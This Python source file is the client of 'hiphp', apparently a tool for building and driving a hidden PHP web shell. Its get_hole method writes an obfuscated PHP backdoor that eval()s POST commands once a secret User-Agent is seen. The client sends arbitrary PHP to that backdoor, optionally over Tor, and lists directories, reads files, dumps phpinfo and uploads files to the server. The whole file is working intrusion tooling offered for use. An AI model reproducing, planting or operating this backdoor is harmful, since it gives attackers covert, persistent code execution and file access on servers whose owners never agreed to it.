#!/usr/bin/env python
# coding:utf-8
#   |                                                          |
# --+----------------------------------------------------------+--
#   |   Code by : yasserbdj96                                  |
#   |   Email   : yasser.bdj96@gmail.com                       |
#   |   Github  : https://github.com/yasserbdj96               |
#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
# --+----------------------------------------------------------+--  
#   |        all posts #yasserbdj96 ,all views my own.         |
# --+----------------------------------------------------------+--
#   |                                                          |

#START{
from hiphp.hiphpcoding import rot13,tobase64,tomd5
from hiphp.hiphpphpfunctions import *
from hiphp.hiphphelp import help
from hiphp.hiphpmsgs import *
from hiphp.hiphplicense import license
from hiphp.hiphpabout import about
from hiphp.hiphplogo import *
from hiphp.hiphpversion import __version__
from ashar import *
from hexor import *
from asciitext import *
import requests
import re
import ast
#import readline
from os.path import exists
from biglibrary import *

#start hiphp class:
class hiphp:
    #__init__:
    def __init__(self,key,url,retu=False):
        #
        self.key=tomd5(key)
        self.url=url
        self.retu=retu
        #
        url_w=re.compile(r"https?://(www\.)?")
        self.url_w=url_w.sub('',url).strip().strip('/')
        #
        self.headers={'User-Agent':self.key}
        #colors:
        self.color=hexor(True,"hex")
        self.color2=hexor(False,"hex")
        #
        self.c_red="#ea4335"#red
        self.c_white_red="#f3938b"#white-red
        self.c_blue="#4285f4"#blue
        self.c_yellow="#fbbc05"#yellow
        self.c_green="#34a853"#green
        #
        self.set=""
        self.do_x=0

    #cli:
    def cli(self):
        #
        logox=""
        if self.do_x==0:
            logox=logo(__version__)
            self.do_x+=1
        #
        reee=hiphp.do(self,self.key,self.url,self.headers,True,"echo getcwd();")
        if emsg_1 in reee:
            return reee
        else:
            getcwd=self.color.c(reee,self.c_green)
        #
        xxr1=self.color.c('┌──(',self.c_blue)
        xxr2=self.color.c(')──[',self.c_blue)
        xxr3=self.color.c(']',self.c_blue)
        xxr4=self.color.c('└─|>',self.c_blue)
        #
        key_w_color=self.color.c(self.key,self.c_red)
        url_w_color=self.color.c(self.url_w,self.c_yellow)
        at=self.color.c("|",self.c_white_red)
        print(logox+xxr1+key_w_color+at+url_w_color+xxr2+getcwd+xxr3)

        #try:
        command=input(xxr4)
        #except:
        #    exit()
        if command and command!="":
            #help
            if command[0:6]=="--help":
                print(help())
            #exit
            elif command[0:6]=="--exit":
                exit()
            #license
            elif command[0:9]=="--license":
                print(license())
            #about
            elif command[0:7]=="--about":
                print(about())
            #update
            elif command=="--update":
                r = "https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
                version = requests.get(r).text
                version=version.replace('\n', ' ').replace('\r', '').replace(' ', '')
                if version==__version__:
                    new=False
                else:
                    p1,p2,p3=version.split(".")
                    s1,s2,s3=__version__.split(".")
                    if p1>=s1 and p2>=s2 and p3>s3:
                        new=True
                    elif p1>=s1 and p2>s2 and p3<=s3:
                        new=True
                    else:
                        new=False
                if new==True:
                    print(f"There is a new update {version}")
                    print("Download the new version from 'https://github.com/yasserbdj96/hiphp'")
                else:
                    print("No updates available")
            #ls
            elif command[0:4]=="--ls":
                if len(command)==4:
                    command=scandir()
                elif command[5:9]=="-all":
                    dirx=command[10:]
                    if dirx=="":dirx="./"
                    command=scandir_all(dirx)
                else:
                    dirx=command[5:]
                    command=scandir(dirx)
                sd=hiphp.do(self,self.key,self.url,self.headers,True,command)
                x=ast.literal_eval(sd)

                
                for i in range(len(x)):
                    if x[i]!="." and x[i]!="..":
                        x[i]=x[i].replace("\/","/")
                
                biglibrary().lslist(x,separator=" | ")
            #set
            elif command[0:5]=="--set":
                self.set+=command[6:]
            #delete set
            elif command[0:6]=="--dset":
                self.set=""
            #clear
            elif command[0:5]=="--cls":
                os.system('cls' if os.name == 'nt' else 'clear')
            #Get the hole Code
            elif command[0:6]=="--geth" or command[0:15]=="HIPHP_HOLE_CODE":
                hiphp.get_hole(self,get=True)
            #cat
            elif command[0:5]=="--cat":
                dirx=command[6:]
                command=file_get_contents(dirx)
                hiphp.do(self,self.key,self.url,self.headers,False,command)
            #php_info:
            elif command=="--phpinfo":
                command=php_info()
                hiphp.do(self,self.key,self.url,self.headers,False,command)
            #rf
            elif command[0:4]=="--rf":
                varss=command.split(" ")
                
                if varss[len(varss)-1]=="":
                    del varss[len(varss)-1]
                print(hiphp.run_file(self,varss[1],varss[2:]))
            #up
            elif command[0:4]=="--up":
                v=command[5:].split(" ")
                if len(v)>1:
                #try:
                    file_path=v[0]
                    to=v[1]
                    if to[len(to)-1:len(to)]!="/":
                        to=to+"/"
                    hiphp.upload(self,file_path,to)                    
                #except:
                else:
                    hiphp.upload(self,command[5:].split(" ")[0])
            else:
                hiphp.do(self,self.key,self.url,self.headers,False,command)
        else:
            self.color2.c(emsg_2,self.c_red)
        hiphp.cli(self)

    #do:
    def do(self,key,url,header,retu,command):
        regex = re.compile(r"^https?\:\/\/[\w\-\.]+\.onion")
        proxies = {'http': 'socks5h://127.0.0.1:9150','https': 'socks5h://127.0.0.1:9150'}

        try:
            if regex.match(url):
                #.onion
                response=requests.post(url,headers=header,proxies=proxies)
            else:
                response=requests.post(url,headers=header)
            #response=requests.post(url,headers=header)
            #
            if response.status_code==200:
                key_len=len(key)+1
                # if the key are true:
                if response.text[0:key_len]=="#"+key:
                    ploads={'command':self.set+command}
                    if ".onion" in url:
                        response=requests.post(url,headers=header,data=ploads,proxies=proxies)
                    else:
                        response=requests.post(url,headers=header,data=ploads)
                    response_text=response.text[key_len:]
                    if retu==True:
                        return response_text
                    else:
                        if len(response_text)!=0:
                            print(response_text)
                else:
                    if retu==True:
                        return emsg_1
                    else:
                        hexor().c(emsg_1,self.c_red)
                        exit()
        except:
            hexor().c(emsg_3+" '"+url+"'.",self.c_red)
            exit()

    #run_file:
    def run_file(self,file_path,*opts):        
        if exists(file_path):
            open_file=open(file_path).read()

            if open_file[0:5]=="<?php":
                open_file=open_file[6:]
            if open_file[len(open_file)-2:len(open_file)]=="?>":
                open_file=open_file[:len(open_file)-2]
            
            if len(opts)>0:
                if type(opts[0])==list:
                    opts=opts[0]
                
                for i in range(len(opts)):
                    value,string=opts[i].split("==")
                    open_file=open_file.replace(f"__{value}__",string)
            
            result=hiphp.do(self,self.key,self.url,self.headers,True,open_file)
            if self.retu==False:
                print(result)
            return result
        else:
            self.color2.c(emsg_4,self.c_red)

    #run:
    def run(self,command):
        if self.retu==True:
            return hiphp.do(self,self.key,self.url,self.headers,True,command)
        else:
            hiphp.do(self,self.key,self.url,self.headers,False,command)

    #upload:
    def upload(self,path_to_upluad,to=""):
        try:
            with open(path_to_upluad,"rb") as base64_file:
                encoded_string=tobase64(base64_file.read().decode("utf-8"))
            p=""
            if to!="":
                if to[0:2]!="./":
                    p="./"
                hiphp.run(self,"if(!file_exists('"+p+to+"')){mkdir('"+p+to+"',0777,true);}")
            hiphp.run(self,f'Fwrite(fopen("{p+to+os.path.basename(path_to_upluad)}","w+"),base64_decode("{encoded_string}"));')
        except:
            self.color2.c(f"{emsg_5} '{path_to_upluad}'.",self.c_red)

    #get the hole:
    def get_hole(self,get=False):
        code="if($_SERVER['HTTP_USER_AGENT']=='"+self.key+"'){echo'#"+self.key+"';if(isset($_POST['command'])){eval($_POST['command']);}exit;}"
        code=rot13(tobase64(rot13(tobase64(rot13(code)))))
        code=f"eval(str_rot13(base64_decode(str_rot13(base64_decode(str_rot13('{code}'))))));"
        php_s="/*php code start*/"
        php_e="/*php code end*/"

        if self.retu==True and get==False:
            return php_s+"\n"+code+"\n"+php_e
        else:
            geth=self.color.c(msg_1+"\n",self.c_yellow)
            geth+=self.color.c(php_s+"\n",self.c_red)
            geth+=self.color.c(code+"\n",self.c_green)
            geth+=self.color.c(php_e,self.c_red)
            print(geth)
#}END.